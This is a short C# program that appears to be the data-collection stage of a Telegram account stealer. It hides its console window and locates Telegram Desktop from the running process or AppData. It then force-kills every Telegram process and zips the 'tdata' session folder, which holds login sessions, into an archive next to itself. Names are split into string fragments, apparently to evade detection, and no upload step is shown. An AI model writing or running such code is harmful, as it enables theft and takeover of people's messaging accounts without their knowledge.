using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool FreeConsole();

FreeConsole();

var telegramFolderPath = GetTelegramFolderPath();


if (string.IsNullOrEmpty(telegramFolderPath))
{
    var p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
    if (Directory.Exists(p)) ;
    {
        telegramFolderPath = p;
    }
}

if (!string.IsNullOrEmpty(telegramFolderPath) && Directory.Exists($"{telegramFolderPath}\\tdata"))
{
    var t5 = @"tda";
    var t6 = @"ta.zip";
    var destinationZip = $"{AppDomain.CurrentDomain.BaseDirectory}{t5}{t6}";
    if (File.Exists(destinationZip))
    {
        File.Delete(destinationZip);
    }

    ZipFile.CreateFromDirectory($"{telegramFolderPath}\\tdata", destinationZip,
        CompressionLevel.Fastest, false);
}

return;


static string? GetTelegramFolderPath()
{
    string? ret = null;
    foreach (var process in Process.GetProcessesByName("Telegr" + "am"))
    {
        try
        {
            ret = Path.GetDirectoryName(process.MainModule?.FileName);
        }
        catch
        {
            // Ignoring any exception and continue checking other processes
        }
    }

    KillTelegramProcesses();

    return ret;
}

static void KillTelegramProcesses()
{
    foreach (var process in Process.GetProcessesByName("Tel" + "egram"))
    {
        try
        {
            process.Kill();
            process.WaitForExit();
        }
        catch (Exception)
        {
            // ignored
        }
    }
}